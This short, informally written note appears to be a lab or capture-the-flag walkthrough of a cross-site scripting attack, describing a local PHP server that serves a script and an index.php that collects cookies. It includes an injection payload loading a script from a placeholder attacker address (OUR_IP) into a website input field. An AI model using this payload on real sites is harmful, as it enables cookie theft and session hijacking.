website field is vulnerable 
createt php server and put script with diffrent path into every field to find the website input field  as vulnerable

used a script.js to an saved it on local machine (same place i started the php server on) 
plus used a index.php to collect multiple coockies 

then started php server and put <script src="http://OUR_IP/script.js"></script> into the website input field and sent it.
